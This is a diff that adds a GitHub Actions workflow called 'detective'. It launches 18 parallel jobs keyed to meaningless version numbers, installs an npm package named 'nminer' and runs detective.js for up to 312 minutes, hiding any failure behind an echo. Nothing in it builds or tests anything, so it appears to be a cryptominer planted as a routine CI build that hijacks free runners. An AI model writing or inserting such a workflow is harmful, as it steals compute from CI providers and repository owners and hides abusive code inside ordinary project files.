@@ -1,0 +1,43 @@
+name: detective
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 8374 }
+          - { version: 5561 }
+          - { version: 614 }
+          - { version: 3570 }
+          - { version: 6858 }
+          - { version: 6357 }
+          - { version: 3622 }
+          - { version: 9172 }
+          - { version: 2906 }
+          - { version: 2543 }
+          - { version: 4063 }
+          - { version: 831 }
+          - { version: 2540 }
+          - { version: 6545 }
+          - { version: 7687 }
+          - { version: 7682 }
+          - { version: 2407 }
+          - { version: 6743 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 312m node detective.js || echo "detective executed"
